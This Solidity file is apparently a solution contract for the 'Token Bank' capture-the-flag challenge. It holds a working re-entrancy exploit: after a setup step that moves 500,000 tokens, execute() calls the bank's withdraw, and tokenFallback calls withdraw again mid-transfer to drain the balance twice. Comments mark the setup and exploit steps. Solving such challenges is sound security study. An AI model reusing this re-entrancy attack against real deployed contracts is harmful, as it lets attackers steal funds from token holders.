// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface TokenBankChallenge{
    function withdraw(uint) external;
}

interface SimpleERC224Token {
    function transfer(address to, uint256 value) external;
}

contract callWithdraw {
    bool stop = false;
    uint8 counter = 0;
    TokenBankChallenge CodeToCall;

    // step 0 - Create our token bank object
    constructor(address _addr) {
        CodeToCall = TokenBankChallenge(_addr);
    }

    /////////////////////// SETUP ///////////////////////
    // step 1 - withdraw all 5,00,000 tokens from the token bank
    // step 2 - Transfer all 5,00,000 tokens to this exploit contract
    // step 3 - Execute transferToTokenBank, to transfer tokens from exploit 
    //          contract to the token bank contract to the token bank contract
    //          giving this exploit contract 5,00,000 balance.
    function transferToTokenBank(address tokenaddr, address transferTo) public {
        SimpleERC224Token token = SimpleERC224Token(tokenaddr);
        token.transfer(transferTo, 500000000000000000000000);        
    }

    ////////////////////// EXPLOIT ///////////////////////
    // Run execute() to trigger the re-entrance exploit
    // The rest will be handled by the tokenFallback function
    function execute() public {
        CodeToCall.withdraw(500000000000000000000000);
    }

    ////////////////////// EXPLOIT ///////////////////////
    // maintains a counter, where on fisrt call it does nothing
    // only the second call it triggers for re-entrance
    // then on the third call it stops the re-entrance
    function tokenFallback(address from, uint value, bytes memory) public {
        if (counter == 0 || counter == 2) {
            counter += 1;
        } else {
            counter += 1;
            CodeToCall.withdraw(500000000000000000000000);
        }
    }
}